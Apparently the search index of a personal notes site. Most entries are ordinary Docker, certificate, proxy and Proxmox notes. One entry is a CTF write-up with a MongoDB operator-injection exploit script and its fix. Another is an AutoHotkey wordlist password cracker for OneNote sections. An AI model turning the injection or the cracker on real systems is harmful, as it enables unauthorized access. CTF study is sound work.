db.collection('users').findOne({ 'username': req.body.username }).then(results =&gt; {\n    if (results) {\n      res.status(400).send('Username already in use');\n      return;\n    }\n    argon2.hash(req.body.password).then(hash =&gt; {\n      db.collection('users').insertOne({ 'username': req.body.username, 'password': hash }).then(results =&gt; {\n        req.session.user = req.body.username;\n        res.redirect('/');\n      });\n    });\n  });\n});\n</code></pre></p> <p>Trying the Endpoint directly confirms the suspicion. MongoDB Operators are directly executable. <pre><code># This Request always returns \"Username already in use\" because the query \"{\"$ne\": null}\" returns the first user \n# which names is not null (which is always the first user). \nPOST http://localhost:8199/register HTTP/1.1\ncontent-type: application/json\n\n{\n  \"username\": {\"$ne\": null},\n  \"password\": \"$#@Call4Code\"\n}\n</code></pre></p> <p>This holds true for multiple functions and googling the words <code>mongodb</code> <code>findOne</code>, <code>vulnerability</code> leads to possible NoSQL injections.  So how to fix it? - Stackoverflow is your friend.  I didn't use the package recommended there, but instead used express-mongo-sanitize. Installing it and adding the following two lines fixed the problem. </p> <pre><code>// app.js\n\n/**\n  * Adding the following line to load the sanitizer\n  */\nconst mongoSanitize = require('express-mongo-sanitize');\n\n// ...\n\napp.use(logger('dev'));\napp.use(express.json());\napp.use(express.urlencoded({ extended: false }));\n\n/**\n  * Use the sanitizer.\n  */\napp.use(mongoSanitize());\napp.use(cookieParser());\n</code></pre> <p>Trying the endpoints again leads to a new user <code>{\"$ne\": null}</code>. :)</p>","tags":["ctf","hacking","tu-berlin"]},{"location":"blog/2021/04/17/first-ctf-at-tu-berlin-bambi.html#stonksexchange-exploit","title":"Stonksexchange Exploit","text":"<p>Now that we know that the endpoints <code>/register</code>, <code>/login</code> and <code>/messages</code> are vulnerable we have to look for the flags.</p> <p>Notice that you won't have any flags locally because there is no server putting them there! </p> <p>Looking into the database we can see messages with flags. But how to retrieve them?</p> <p></p> <p>Having a look at the <code>/messages</code> endpoint we can see that <code>req.session.user</code> is used without sanitizing it, which means if we can put an Operator like <code>{\"$regex\": \".\"}</code> there (which matches any character and thus any user), we can retrieve the first 50 messages of the database.  <pre><code>router.get('/messages', function (req, res, next) {\n  if (!req.session.user) {\n    res.status(403).send('Not logged in');\n    return;\n  }\n  var db = req.app.locals.db;\n  /**\n    * Notice that req.session.user is passed without sanitizing it\n    */\n  db.collection('messages').find({ 'username': req.session.user }, { 'sort': { '$natural': -1 } }).limit(50).toArray((err, results) =&gt; {\n    if (err) {\n      res.status(500).send('Internal server error');\n      return;\n    }\n    res.locals.messages = results;\n    res.render('messages', { title: 'Messages' });\n  });\n});\n</code></pre></p> <p>Because <code>user</code> is read from the <code>session</code> we have to \"login\" with the query we want to execute first. </p> <pre><code>router.post('/login', function (req, res) {\n  if (!req.body.username || !req.body.password) {\n    res.status(400).send('Missing username or password');\n    return;\n  }\n  var db = req.app.locals.db;\n  /**\n    * The first user matching the username is returned, \n    * if the username is a query like {\"$regex\": \".\"} we have to consider the sort function.\n    */\n  db.collection('users').findOne({ 'username': req.body.username }, { 'sort': { '$natural': -1 } }).then(results =&gt; {\n    if (!results) {\n      res.status(400).send('Invalid username or password');\n      return;\n    }\n    argon2.verify(results.password, req.body.password).then(result =&gt; {\n      if (!result) {\n        res.status(400).send('Invalid username or password');\n        return;\n      }\n      req.session.user = req.body.username;\n      res.redirect('/');\n    });\n  });\n});\n</code></pre> <p>Viewing the <code>/login</code> enpoint we can see that the first user matching the query will be returned. As we want the username to be <code>{\"$regex\": \".\"}</code> we have to consider the (natural) sort order. </p> <p></p> <p>In this case <code>findOne</code> will always return the last created user. For a successful login we have to know the password of the user. What better way to just create one?</p> <p>Lets put it together in a python script:</p> <pre><code>import requests\nbase = \"http://localhost:8199\"\n\n# Prepare the exploit by creating a user with a password we know\nprepare = requests.Session()\nregister = prepare.post(base + '/register', json={ 'username': \"sdfsdf\", \"password\": \"masterpass\" })\n# This status code should be 200\nprint(register.status_code)\n\n# Create the exploit Session\nexploit = requests.Session()\n# Login with the query we want to execute\nregister = exploit.post(base + '/login', json={ 'username': {\"$regex\": \".\"}, \"password\": \"masterpass\" })\n# This status code should be 200\nprint(register.status_code)\n\n# Get all messages\nmessages = exploit.get(base + \"/messages\")\nprint(messages.content)\n</code></pre> <p>During the CTF new users where created from other people exploiting the service, which meant that in order to login with all matching regex a new user had to be created each time. </p> <p>Thanks to Enoflag for hosting this event!</p>","tags":["ctf","hacking","tu-berlin"]},{"location":"development/angular_unit_test_errors.html","title":"Angular unit test errors","text":"<p>Just add <code>NO_ERRORS_SCHEMA</code> to you Test file and you dont have to care about imports from other components. You can still test normally with spies, Mocks or other ways.</p> <pre><code>import { TestBed, inject } from '@angular/core/testing';\n\nimport { ComponentToTest } from './componentToTest';\nimport { SomeService } from 'app/service';\nimport { NO_ERRORS_SCHEMA } from '@angular/core';\n\ndescribe('ReleaseInfoService', () =&gt; {\n let component: AddFilterComponent;\n let fixture: ComponentFixture&lt;AddFilterComponent&gt;;\n\n  beforeEach(() =&gt; {\n    TestBed.configureTestingModule({\n      declaration: [ComponentToTest],\n      providers: [SomeService],\n      schemas: [NO_ERRORS_SCHEMA]\n    });\n  });\n\n  beforeEach(() =&gt; {\n    fixture = TestBed.createComponent(ComponentToTest);\n    component = fixture.componentInstance;\n    fixture.detectChanges();\n  });\n\n\n\n  it('should be created') =&gt; {\n    expect(component).toBeTruthy();\n  }));\n});\n</code></pre>"},{"location":"development/create_ssl_certificates.html","title":"Create Valid Certificate Chain for use in multiple Docker Containers","text":"<pre><code># Create Root Key\n\nopenssl genrsa -des3 -out testca.key -passout pass:password 4096\n\n# Create CA Certificate\nopenssl req -x509 -new -nodes -key testca.key -passin pass:password -sha256 -days 1826 -out testca.crt -subj '/CN=MyOrg Root CA/C=AT/ST=Dresden/L=Dresden/O=MyOrg'\n</code></pre>"},{"location":"development/create_ssl_certificates.html#create-certificate-for-a-service","title":"Create Certificate for a Service","text":"<pre><code>FROM mcr.microsoft.com/dotnet/sdk:6.0 AS certificates\n# Create development ssl Certifcate: https://learn.microsoft.com/en-us/dotnet/core/additional-tools/self-signed-certificates-guide#with-openssl\nSHELL [\"/bin/bash\", \"-c\"]\nCOPY testca.key testca.key\nCOPY testca.crt testca.crt\n\nENV MYCERT=servercert\nENV CANAME=testca\nRUN openssl req -new -nodes -out $MYCERT.csr -newkey rsa:4096 -keyout $MYCERT.key -subj '/CN=Testcertificate/C=AT/ST=Dresden/L=Dresden/O=MyOrg'\n# create a v3 ext file for SAN properties\nRUN echo -e '\\\nauthorityKeyIdentifier=keyid,issuer\\n\\\nbasicConstraints=CA:FALSE\\n\\\nkeyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment\\n\\\nsubjectAltName = @alt_names\\n\\\n[alt_names]\\n\\\nDNS.1 = localhost\\n\\\nDNS.2 = host.testcontainers.internal\\n\\\nDNS.3 = identityserver'\\\n&gt;&gt; $MYCERT.v3.ext\n\nRUN openssl x509 -req -in $MYCERT.csr -CA $CANAME.crt -CAkey $CANAME.key -passin pass:password -CAcreateserial -out $MYCERT.crt -days 730 -sha256 -extfile $MYCERT.v3.ext\nRUN openssl pkcs12 -export -out $MYCERT.pfx -inkey $MYCERT.key -in $MYCERT.crt -password pass:\n\nCOPY --from=certificates servercert.pfx servercert.pfx\n\nENV Kestrel__Certificates__Default__Path=servercert.pfx\nENV Kestrel__Certificates__Default__Password=\"\"\n</code></pre>"},{"location":"development/create_ssl_certificates.html#trust-the-root-ca","title":"Trust the Root CA:","text":"<pre><code>COPY testca.crt /usr/local/share/ca-certificates/testca.crt\nRUN update-ca-certificates\n</code></pre> <p>Thanks to: https://arminreiter.com/2022/01/create-your-own-certificate-authority-ca-using-openssl/</p> <p>https://learn.microsoft.com/en-us/dotnet/core/additional-tools/self-signed-certificates-guide#with-openssl</p> <p>Or </p> <pre><code>FROM smallstep/step-ca AS certs\n\nRUN pwd &amp;&amp; step certificate create \"Smallstep Root CA\" \"/tmp/cacert.pem\" \"/tmp/cakey.pem\" \\\n    --no-password --insecure \\\n    --profile root-ca \\\n    --not-before \"2021-01-01T00:00:00+00:00\" \\\n    --not-after \"2031-01-01T00:00:00+00:00\" \\\n    --san \"example.com\" \\\n    --san \"mail.example.com\" \\\n    --kty RSA --size 2048\n\n# RUN step certificate create \"Smallstep Leaf\" mail.example.test-cert.pem mail.example.test-key.pem \\\n#     --no-password --insecure \\\n#     --profile leaf \\\n#     --ca \"cacert.pem\" \\\n#     --ca-key \"cakey.pem\" \\\n#     --not-before \"2021-01-01T00:00:00+00:00\" \\\n#     --not-after \"2031-01-01T00:00:00+00:00\" \\\n#     --san \"example.test\" \\\n#     --san \"mail.example.test\" \\\n#     --kty RSA --size 2048\n\n\nCOPY --from=certs /tmp/* /tmp/dms/custom-certs/\n</code></pre>"},{"location":"development/docker-centos-7.html","title":"Docker centos 7","text":"<ol> <li>Prerequisite for Docker is container-se-linux, you have to install it manually (from: https://stackoverflow.com/a/46209054/9277073)     a. Search for the latest se-linux-container: http://mirror.centos.org/centos/7/extras/x86_64/Packages/ and install it:     b. <code>$ yum install -y http://mirror.centos.org/centos/7/extras/x86_64/Packages/container-selinux-2.66-1.el7.noarch.rpm</code></li> <li>Go on and install Docker (https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-centos-7)     a. <code>$ curl -fsSL https://get.docker.com/ | sh</code>     b. <code>$ sudo systemctl start docker</code>     c. <code>$ sudo systemctl enable docker</code></li> </ol> <p>Attention CentOS7's FirewallD and Docker do not like each other:</p> <ol> <li>This command makes them behave (From: https://unix.stackexchange.com/questions/199966/how-to-configure-centos-7-firewalld-to-allow-docker-containers-free-access-to-th):    <code>$ firewall-cmd --permanent --zone=trusted --change-interface=docker0</code></li> <li>Furthermore, to allow communication between docker Containers (From: https://support.onegini.com/hc/en-us/articles/115000769311-Firewalld-error-with-Docker-No-route-to-host-)     a. $ firewall-cmd --permanent --direct --add-rule ipv4 filter INPUT 4 -i docker0 -j ACCEPT</li> <li><code>$ firewall-cmd --reload</code></li> <li><code>$ systemctl restart docker</code></li> </ol> <p>Allow some ports:</p> <p>https://www.digitalocean.com/community/tutorials/how-to-set-up-a-firewall-using-firewalld-on-centos-7</p> <p>sudo firewall-cmd --zone=public --permanent --add-service=http</p> <p>sudo firewall-cmd --zone=public --permanent --add-service=https</p> <p>Install docker-compose:</p> <p>https://docs.docker.com/compose/install/#install-compose</p> <p>If on Puppet Image set TMP: https://github.com/docker/compose/issues/1339#issuecomment-415068438</p> <p>If there still is an error like \"no route to host\":</p> <p>https://forums.docker.com/t/no-route-to-host-network-request-from-container-to-host-ip-port-published-from-other-container/39063/6</p> <p>Add some networks to the firewall, for example 172.17...20.0.0/16</p> <p>Set Proxy: https://docs.docker.com/config/daemon/systemd/#httphttps-proxy</p> <p>[Service] Environment=\"HTTP_PROXY=http://iproxy.domain.de:8080/\" \"NO_PROXY=localhost,127.0.0.1,.domain.de\"</p> <p>Go on with installation of kubernetes: https://www.techrepublic.com/article/how-to-install-a-kubernetes-cluster-on-centos-7/</p> <p>https://medium.com/@gargankur74/setting-up-standalone-kubernetes-cluster-behind-corporate-proxy-on-ubuntu-16-04-1f2aaa5a848</p> <p>https://kubernetes.io/docs/setup/independent/create-cluster-kubeadm/</p>"},{"location":"development/docker_context_size_debugging.html","title":"Search for what makes your context size so big","text":"<pre><code>services:\n  test:\n    build:\n      context: .\n      dockerfile: test.Dockerfile\n</code></pre> <pre><code>FROM bytesco/ncdu\n\nWORKDIR temp\nCOPY . .\n</code></pre> <p>Run <code>docker compose --build</code> and <code>docker compose run test</code> to build and review the context changes.</p>"},{"location":"development/dotnet-validate-and-bind.html","title":"Dotnet validate and bind","text":"<p>rehackt.extensions.options.validation</p> <pre><code>builder.Services.ConfigureAndValidate&lt;AppSettingsRootConfiguration&gt;(options =&gt;\n{\n    builder.Configuration.Bind(options);\n});\n\nbuilder.Services.AddSingleton(provider =&gt; Options.Create(provider\n    .GetRequiredService&lt;IOptions&lt;AppSettingsRootConfiguration&gt;&gt;().Value\n    .MacToolConfiguration));\n\nbuilder.Services.AddSingleton(provider =&gt; provider\n    .GetRequiredService&lt;IOptions&lt;AppSettingsRootConfiguration&gt;&gt;().Value.MacToolConfiguration\n);\nbuilder.Services.AddSingleton(provider =&gt; provider\n    .GetRequiredService&lt;IOptions&lt;AppSettingsRootConfiguration&gt;&gt;().Value.Authentication\n);\nbuilder.Services.AddSingleton(provider =&gt; provider\n    .GetRequiredService&lt;IOptions&lt;AppSettingsRootConfiguration&gt;&gt;().Value.MacToolConfiguration.LdapServerConfiguration\n);\nbuilder.Services.AddSingleton(provider =&gt; provider\n    .GetRequiredService&lt;IOptions&lt;AppSettingsRootConfiguration&gt;&gt;().Value.MacToolConfiguration.ValidationConfiguration\n);\n</code></pre>"},{"location":"development/python_alembic_e2e_test_migrations.html","title":"Run Migration before E2E Test","text":"<p>Add pr replace this function in your <code>env.py</code> <pre><code>from sqlalchemy.ext.asyncio import async_engine_from_config\n\ndef run_migrations_online():\n    connectable = config.attributes.get(\"connection\", None)\n\n    if connectable is None:\n        # only create Engine if we don't have a Connection\n        # from the outside\n        connectable = engine_from_config(\n            config.get_section(config.config_ini_section), prefix=\"sqlalchemy.\", poolclass=pool.NullPool\n        )\n\n        with connectable.connect() as connection:\n            context.configure(connection=connection, target_metadata=target_metadata)\n\n            with context.begin_transaction():\n                context.run_migrations()\n    else:\n        context.configure(connection=connectable, target_metadata=target_metadata)\n\n        with context.begin_transaction():\n            context.run_migrations()\n</code></pre></p> <p>Use this fixture in your tests:  <pre><code>@pytest_asyncio.fixture()\nasync def database_client():\n    with PostgresContainer(\"postgres:16\") as postgres:\n        connection_string = postgres.get_connection_url().replace(\"psycopg2\", \"asyncpg\")\n\n        # Run Migration\n        def run_upgrade(connection):\n            alembic_cfg = Config()\n            alembic_cfg.set_main_option(\"script_location\", \"app/backend/alembic\")\n            alembic_cfg.set_main_option(\"url\", connection_string)\n            alembic_cfg.attributes[\"connection\"] = connection\n            command.upgrade(alembic_cfg, \"head\")\n\n        async_engine = create_async_engine(connection_string, echo=True)\n        async with async_engine.begin() as conn:\n            await conn.run_sync(run_upgrade)\n\n        # Initialize your Test SQL Client (or something else)\n        database_client = PSqlClientClient(connection_string=connection_string)\n        await database_client.init()\n        yield database_client\n        await database_client.close()\n</code></pre></p>"},{"location":"development/vscode-non-relative-import.html","title":"Vscode non relative import","text":"<p>Most of the time VSCode imports javascript and typescript files with relative paths, for example \"../../../module\". </p> <p>If you don't like that just set these two settings: </p> <pre><code>\"javascript.preferences.importModuleSpecifier\": \"non-relative\",\n\"typescript.preferences.importModuleSpecifier\": \"non-relative\"\n</code></pre> <p>It changes the way VSCode handles imports to non relative imports, for example \"app/path/to/module\"</p>"},{"location":"development/wsl-ubuntu-bash-proxy.html","title":"Wsl ubuntu bash proxy","text":"<p>M\u00f6chte man die Bash mit Ubuntu unter Windows 10 innerhalb einer Firma mit Proxy nutzen wird man Probleme haben Zugriffe in das Internet ausf\u00fchren zu k\u00f6nnen. Die Ursache daf\u00fcr ist dann unter Umst\u00e4nden, dass das Ubuntu Subsystem keine Kenntnisse von unserem Proxy hat.</p> <p>Im Folgenden wird Beispielhaft gezeigt wie man diese Einstellungen setzen kann.</p> <p>Es gilt zu beachten, dass verschiedene Programme unterschiedliche Einstellungen ben\u00f6tigen k\u00f6nnen</p>"},{"location":"development/wsl-ubuntu-bash-proxy.html#manuell","title":"Manuell","text":"<p>F\u00fcr die meisten Programme reicht es entsprechende Umgebungsvariablen zu setzen.</p>"},{"location":"development/wsl-ubuntu-bash-proxy.html#setzen","title":"Setzen","text":"<pre><code>export {http,https,ftp}_proxy=\"http://proxy.domain.de:8080\"\nexport {HTTP,HTTPS,FTP}_PROXY=\"http://proxy.domain.de:8080\"\nexport {no_proxy,NO_PROXY}=\"localhost,127.0.0.1,.domain.de,.company.de\"\n</code></pre>"},{"location":"development/wsl-ubuntu-bash-proxy.html#loschen","title":"L\u00f6schen","text":"<pre><code>unset {http,https,ftp}_proxy\nunset {HTTP,HTTPS,FTP}_PROXY\nunset {no_proxy,NO_PROXY}\n</code></pre>"},{"location":"development/wsl-ubuntu-bash-proxy.html#automatisch","title":"Automatisch","text":"<p>M\u00f6chte man diese Einstellungen persistent haben kann man die Befehle auch in die .bashrc eintragen. Die Eintr\u00e4ge sollten ganz am Ende eingef\u00fcgt werden.</p> <p><code>sudo vi ~/.bashrc</code></p> <p>Tipp: Aus VI kommt man wieder raus in dem man folgendes dr\u00fcckt: ESC &gt; : &gt; wq &gt; Enter</p> <p>Nachdem diese Datei angepasst wurde muss man das System veranlassen diese neu zu verarbeiten:</p> <p><code>source ~/.bashrc</code></p>"},{"location":"development/wsl-ubuntu-bash-proxy.html#nach-bedarf","title":"Nach Bedarf","text":"<p>M\u00f6chte man den Proxy nach Bedarf ein und aus schalten kann man sich diesen Code Block in die .bashrc einf\u00fcgen (mit nano ~/.bashrc):</p> <pre><code># Set Proxy\nfunction proxyon() {\n    export {http,https,ftp}_proxy=\"http://proxy.domain.de:8080\"\n    export {HTTP,HTTPS,FTP}_PROXY=\"http://proxy.domain.de:8080\"\n    export {no_proxy,NO_PROXY}=\"localhost,127.0.0.1,.domain.de,.company.de\"\n    echo Proxy is on\n}\n\n# Unset Proxy\nfunction proxyoff() {\n    unset {http,https,ftp}_proxy\n    unset {HTTP,HTTPS,FTP}_PROXY\n    unset {no_proxy,NO_PROXY}\n    echo Proxy is off\n}\n</code></pre>"},{"location":"development/wsl-ubuntu-bash-proxy.html#sudo-mit-proxy","title":"sudo mit Proxy","text":"<p>Mit sudo visudo \u00f6ffnet man den Editor f\u00fcr die sudo Einstellungen. Darin wird folgendes eingetragen:</p> <pre><code>Defaults        env_keep += \"http_proxy HTTP_PROXY\"\nDefaults        env_keep += \"https_proxy HTTPS_PROXY\"\nDefaults        env_keep += \"ftp_proxy FTP_PROXY\"\nDefaults        env_keep += \"no_proxy NO_PROXY\"\n</code></pre>"},{"location":"development/yubikey-git-sign.html","title":"Yubikey git sign","text":"<p>\"%APPDATA%\\gnupg\\scdaemon.conf\" reader port</p> <p>https://support.yubico.com/hc/en-us/articles/360013714479-Troubleshooting-Issues-with-GPG</p> <pre><code>[alias]\n    c = commit -m\n    aa = add --all\n    s = status \n    slog = log -n 10 --date-order --abbrev-commit --graph --pretty=format:\"%h|%an|%ar|%s\"\n    glog = log --graph --pretty=oneline --abbrev-commit --decorate --branches --all\n[user]\n    name = Daniel Habenicht\n    email = &lt;email&gt;\n    signingkey = FE2557476A8E78C76168FA01D74C64CA74C4E1F0\n[commit]\n    # gpgsign = true\n[gpg]\n    program = C:\\\\Program Files (x86)\\\\GnuPG\\\\bin\\\\gpg.exe\n</code></pre>"},{"location":"gotchas/docker-space-optimization.html","title":"Docker space optimization","text":"<p>You're Docker Images are getting bigger? This is how you save some space: </p> <p>Just add this at the end of your apt-get update line: </p> <pre><code>RUN apt-get update &amp;&amp; apt-get install -y your-cool packages &amp;&amp; rm -rf /var/lib/apt/lists/*\n</code></pre> <p>It removes most of the junk installed by apt-get update</p>"},{"location":"gotchas/expand-volume-linux.html","title":"Expand a volume","text":"<p>e.g. after resizing the virtual disk in proxmox. </p> <pre><code># Check volume sizes\nlsblk\nsudo fdisk /dev/sdb\n# p - print\n# d - delete partition entry\n# n - new partition entry, keep defaults or previous values\n# Do NOT remove the signature\n# w - write changes\nsudo resize2fs /dev/sdb1\ndf -h\n</code></pre> <p>Remove reserved space from partition: <code>sudo tune2fs -m 0 /dev/sdb1</code></p>"},{"location":"gotchas/find-onenote-password.html","title":"OneNote Passwort Finder script","text":"<pre><code>DetectHiddenWindows on\nDetectHiddenText on\n\n#k::\nSetKeyDelay 30\nLoop, read, C:\\password_combos.txt\n{\n  TrayTip Now trying:, %A_LoopReadLine%, 1 ;Creates tooltip so we can monitor the progress through wordlist.\n  SendRaw %A_LoopReadLine% ;Type the current line into box\n  Send {enter} ;Submit this password\n  Sleep 300 ;Wait while the password is tried\n  WinGetActiveTitle, varRespondingWindow ;Check resulting dialogue (look for 'invalid passphrase' error)\n\n  if ( varRespondingWindow != \"Protected Section\" ) {\n    ;DEBUG - We found the password. (If the window DOESN'T contain the words Protected Section then we cracked it).\n    MsgBox % \"Password Found: \" . A_LoopReadLine\n    return\n  } else {\n    ;DEBUG - It was wrong \n  }\n}\nreturn\n\n#q::\n    ;This is to exit the script\n    Exit\nreturn\n</code></pre> <p>From: https://blackwoodit.co.uk/knowledge-base/how-to-crack-onenote-sharepoint-online-password/</p>"},{"location":"gotchas/localdb-error.html","title":"Fix various localdb errors","text":"<p>Sometimes LocalDB just does not work. </p> <pre><code>/&gt; SqlLocalDB.exe start\nStart of LocalDB instance \"mssqllocaldb\" failed because of the following error:\nError occurred during LocalDB instance startup: SQL Server process failed to start.\n</code></pre> <p>This is what fixed it for me, most of the time:</p> <pre><code>/&gt; SqlLocalDB.exe delete\nLocalDB instance \"mssqllocaldb\" deleted.\n/&gt; SqlLocalDB.exe create\nLocalDB instance \"mssqllocaldb\" created with version 15.0.4153.1.\n/&gt; SqlLocalDB.exe start\nLocalDB instance \"mssqllocaldb\" started.\n</code></pre> <p>When working with DotNet theses errors can also occur:</p> <pre><code>Microsoft.Data.SqlClient.SqlException : A network-related or instance-specific error occurred while establishing a connection to SQL \nServer. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: SNI_PN11, error: 50 - Local Database Runtime error occurred. Fehler beim Start der LocalDB-Instanz: Der SQL Server-Prozess konnte nicht gestartet werden.)\n</code></pre> <pre><code>Microsoft.Data.SqlClient.SqlException : The log scan number (36:16:3) passed to log scan in database 'model' is not valid. This error may indicate data corruption or that the log file (.ldf) does not match the data file (.mdf). If this error occurred during replication, re-create the publication. Otherwise, restore from backup if the problem results in a failure during startup.\nOne or more recovery units belonging to database 'model' failed to generate a checkpoint. This is typically caused by lack of system resources such as disk or memory, or in some cases due to database corruption. Examine previous entries in the error log for more detailed information on this failure.\n</code></pre> <p>```</p>","tags":["windows","localdb","sql","sqlserver"]},{"location":"homelab/home_nas_server.html","title":"Build of Home NAS/Server","text":"<p>Base Hardware:</p>"},{"location":"homelab/home_nas_server.html#considerations","title":"Considerations","text":"<ul> <li>Encryption at Rest for the whole system</li> <li> </li> </ul> <p>TrueNAS: It's all about the right tool for the job (Remember TrueNAS it built for enterprises!)</p> <ul> <li>No supported Encryption of the boot medium (which contains quite a few secrets)</li> <li>Docker Containers and Running configurations are only supported on unencrypted ZFS Volumes</li> </ul> <p>This led me to Proxmox which has a \"fairly easy\" way of encrypting VMs, allowing me to run all my machines encrypted (at rest).</p> <p>I still choose TrueNAS for data storage (but not for hosting any services).</p>"},{"location":"homelab/home_nas_server.html#energy-efficient","title":"energy efficient","text":"-"},{"location":"homelab/home_nas_server.html#beginners-guide-to-proxmox","title":"Beginners Guide to Proxmox","text":"<ul> <li>Virtualization</li> <li>local and local-lvm are the same disk just that one is folder and the second is a volume on the disk.</li> </ul>"},{"location":"homelab/home_nas_server.html#installation","title":"Installation","text":""},{"location":"homelab/home_nas_server.html#encryption","title":"Encryption","text":"<p>https://privsec.dev/posts/linux/using-native-zfs-encryption-with-proxmox/</p> <ol> <li>Select right ethernet port device</li> <li>Activate PCI Passthrough</li> </ol> <pre><code># From https://pve.proxmox.com/pve-docs/pve-admin-guide.html#sysboot_edit_kernel_cmdline\n# and https://pve.proxmox.com/pve-docs/pve-admin-guide.html#qm_pci_passthrough\n# For GRUB (not used with zfs)\nnano /etc/default/grub\n# Add or update line:\n# GRUB_CMDLINE_LINUX_DEFAULT=\"quiet intel_iommu=on\"\nupdate-grub\n# For systemd-boot\nnano /etc/kernel/cmdline\n# Add or update line:\n# root=ZFS=rpool/ROOT/pve-1 boot=zfs intel_iommu=on\nproxmox-boot-tool refresh\nreboot\ndmesg | grep -e DMAR -e IOMMU -e AMD-Vi\n# Should output: \"DMAR: IOMMU enabled\"\n</code></pre> <pre><code># Unlock\nssh -o StrictHostKeyChecking=no 192.168.178.147 zfsunlock\n</code></pre> <ol> <li>Install TrueNAS with PCI PassThrough for the SATA Port and SATA Controller</li> </ol> <p>Power Optimization</p> <pre><code># Enable SATA Power management\nline=\"@reboot echo 'med_power_with_dipm' &gt; '/sys/class/scsi_host/host0/link_power_management_policy'\"\n(crontab -u $(whoami) -l; echo \"$line\" ) | crontab -u $(whoami) -\nline=\"@reboot echo 'med_power_with_dipm' &gt; '/sys/class/scsi_host/host1/link_power_management_policy'\"\n(crontab -u $(whoami) -l; echo \"$line\" ) | crontab -u $(whoami) -\nline=\"@reboot echo 'med_power_with_dipm' &gt; '/sys/class/scsi_host/host2/link_power_management_policy'\"\n(crontab -u $(whoami) -l; echo \"$line\" ) | crontab -u $(whoami) -\nline=\"@reboot echo 'med_power_with_dipm' &gt; '/sys/class/scsi_host/host3/link_power_management_policy'\"\n(crontab -u $(whoami) -l; echo \"$line\" ) | crontab -u $(whoami) -\nline=\"@reboot echo 'med_power_with_dipm' &gt; '/sys/class/scsi_host/host4/link_power_management_policy'\"\n(crontab -u $(whoami) -l; echo \"$line\" ) | crontab -u $(whoami) -\nline=\"@reboot echo 'med_power_with_dipm' &gt; '/sys/class/scsi_host/host5/link_power_management_policy'\"\n(crontab -u $(whoami) -l; echo \"$line\" ) | crontab -u $(whoami) -\nline=\"@reboot echo 'med_power_with_dipm' &gt; '/sys/class/scsi_host/host6/link_power_management_policy'\"\n(crontab -u $(whoami) -l; echo \"$line\" ) | crontab -u $(whoami) -\n# Use powersaving mode\nline=\"@reboot echo 'powersave' | tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor\"\n(crontab -u $(whoami) -l; echo \"$line\" ) | crontab -u $(whoami) -\n</code></pre>"},{"location":"homelab/home_nas_server.html#use-community-packages","title":"Use community packages","text":"<pre><code>sed -i 's/https:\\/\\/enterprise/http:\\/\\/download/g' /etc/apt/sources.list.d/pve-enterprise.list\nsed -i 's/enterprise/no-subscription/g' /etc/apt/sources.list.d/pve-enterprise.list\n\nsed -i 's/https:\\/\\/enterprise/http:\\/\\/download/g' /etc/apt/sources.list.d/ceph.list\nsed -i 's/enterprise/no-subscription/g' /etc/apt/sources.list.d/ceph.list\napt-get update\napt-get dist-upgrade\n</code></pre> <p>Activate 'Datacenter&gt;Storage&gt;Local' add snippets</p>"},{"location":"homelab/home_nas_server.html#template","title":"Template","text":"<p>https://austinsnerdythings.com/2021/08/30/how-to-create-a-proxmox-ubuntu-cloud-init-image/</p> <pre><code># Prepare Image\ncd /var/lib/vz/template/iso\nwget https://cloud-images.ubuntu.com/jammy/current/jammy-server-cloudimg-amd64.img\n\n\n#sudo virt-customize -a focal-server-cloudimg-amd64.img --run-command 'useradd austin'\n#sudo virt-customize -a focal-server-cloudimg-amd64.img --run-command 'mkdir -p /home/austin/.ssh'\n#sudo virt-customize -a focal-server-cloudimg-amd64.img --ssh-inject austin:file:/home/austin/.ssh/id_rsa.pub\n#sudo virt-customize -a focal-server-cloudimg-amd64.img --run-command 'chown -R austin:austin /home/austin'\n\nqm create 9000 --name \"ubuntu-cloudinit-template\" --memory 2048 --agent 1 --net0 virtio,bridge=vmbr0\n\nqm importdisk 9000 ubuntu-22.04-minimal-cloudimg-amd64.img local-zfs\nqm set 9000 --scsihw virtio-scsi-pci --scsi0 local-zfs:vm-9000-disk-0,cache=writethrough,ssd=1\n\nqm set 9000 --boot c --bootdisk scsi0\n\nqm set 9000 --ide2 local-zfs:cloudinit\nqm set 9000 --serial0 socket --vga serial0\n\ncat &lt;&lt; EOF | tee /var/lib/vz/snippets/vendor.yaml\n#cloud-config\nruncmd:\n    - apt update\n    - apt install -y qemu-guest-agent nano\n    - systemctl start qemu-guest-agent\n    - curl -fsSL https://get.docker.com -o get-docker.sh\n    - sudo sh get-docker.sh\n# Taken from https://forum.proxmox.com/threads/combining-custom-cloud-init-with-auto-generated.59008/page-3#post-428772\nEOF\n\nqm set 9000 --cicustom \"vendor=local:snippets/vendor.yaml\"\nqm set 9000 --ciuser ubuntu\nqm set 9000 --sshkeys ~/.ssh/authorized_keys\nqm set 9000 --ipconfig0 ip=dhcp\nqm resize 9000 scsi0 32G\n\n\n# Create a template\nqm template 9000\n\nqm clone 9000 999 --name test-clone-cloud-init\nqm set 999 --sshkey ~/.ssh/id_rsa.pub\nqm set 999 --ipconfig0 ip=10.98.1.96/24,gw=10.98.1.1\nqm start 999\n</code></pre> <p>On the VM:</p> <pre><code>curl -fsSL https://get.docker.com -o get-docker.sh\nsh get-docker.sh\n</code></pre>"},{"location":"homelab/home_nas_server.html#vms","title":"VMs","text":"<p>This would be the terraform part, but because of many bugs with the proxmox provider I will do it manually for now.</p>"},{"location":"homelab/home_nas_server.html#docker-vm","title":"Docker VM","text":"<ul> <li>dns via <code>bash -c \"$(wget -qLO - https://github.com/tteck/Proxmox/raw/main/ct/technitiumdns.sh)\"</code></li> <li>paperless </li> <li>traefik</li> <li>monica grafana + prometheus</li> <li>truenas through traefik</li> </ul>"},{"location":"homelab/home_nas_server.html#traefik","title":"Traefik","text":"<pre><code>touch acme.json\nroot@ubuntu-docker-host:/home/ubuntu/traefik# chmod 600 acme.json\nroot@ubuntu-docker-host:/home/ubuntu/traefik# docker compose up\n</code></pre>"},{"location":"homelab/home_nas_server.html#paperless-ngx","title":"Paperless NGX","text":"<pre><code>mkdir -v ~/paperless-ngx\nwget https://raw.githubusercontent.com/paperless-ngx/paperless-ngx/dev/docker/compose/docker-compose.postgres-tika.yml\nwget https://raw.githubusercontent.com/paperless-ngx/paperless-ngx/dev/docker/compose/docker-compose.env\n\nmkdir -v ~/traefik\n\n\nmkdir -v ~/monica\n# Change 